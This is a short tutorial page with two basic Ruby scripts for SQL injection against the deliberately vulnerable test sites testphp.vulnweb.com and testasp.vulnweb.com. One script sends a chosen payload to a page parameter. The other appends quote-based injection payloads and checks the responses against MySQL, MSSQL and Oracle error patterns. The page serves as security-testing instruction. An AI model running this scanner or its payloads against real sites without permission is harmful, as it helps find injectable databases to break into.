# SQL Injection Scanner


## Basic SQLi script as command line browser

The is a very basic script take your given payload and send it to the vulnerable parameter and returns the response back to you. I'll use (http://testphp.vulnweb.com/) as it's legal to test it.

```ruby
#!/usr/bin/evn ruby
#
# Send your payload from command line
#
require "net/http"

if ARGV.size < 2
  puts "[+] ruby #{__FILE__} [IP ADDRESS] [PAYLOAD]"
  exit 0
else
  host, payload = ARGV
end

uri = URI.parse("http://#{host}/artists.php?")
uri.query = URI.encode_www_form({"artist" => "#{payload}"})
http = Net::HTTP.new(uri.host, uri.port)
# http.set_debug_output($stdout)

request = Net::HTTP::Get.new(uri.request_uri)
response = http.request(request)
puts "[+] Status code: "+ response.code + "\n\n"
puts response.body.gsub('|\n', '').gsub(/<.*?>/, '')

puts ""
```



Here a very basic and simple SQL-injection solid scanner, develop it as far as you can!

```ruby
#!/usr/bin/env ruby
#
# Very basic SQLi scanner!
#
require 'net/http'

# Some SQLi payloads
payloads =
    [
      '\'',
      '"',
      '\' or 1=2--+'
    ]

# Some database error responses
errors =
    {
      :mysql => [
                 "SQL.*syntax",
                 "mysql.*(fetch).*array",
                 "Warning"
                ],
      :mssql => [
                 "line.*[0-9]",
                 "Microsoft SQL Native Client error.*"
                ],
      :oracle => [
                  ".*ORA-[0-9].*",
                  "Warning"
                 ]
      }

# Try a known vulnerable site
uri  = URI.parse "http://testphp.vulnweb.com/artists.php?artist=1"

# Update the query with a payload
uri.query += payloads[0]

# Send get request
response = Net::HTTP.get uri

# Search if an error occured = vulnerable
puts "[+] The #{uri.to_s} is vulnerable!" unless response.match(/#{errors[:mysql][0]}/i).nil?

```

Try this url (http://testasp.vulnweb.com/showforum.asp?id=0)

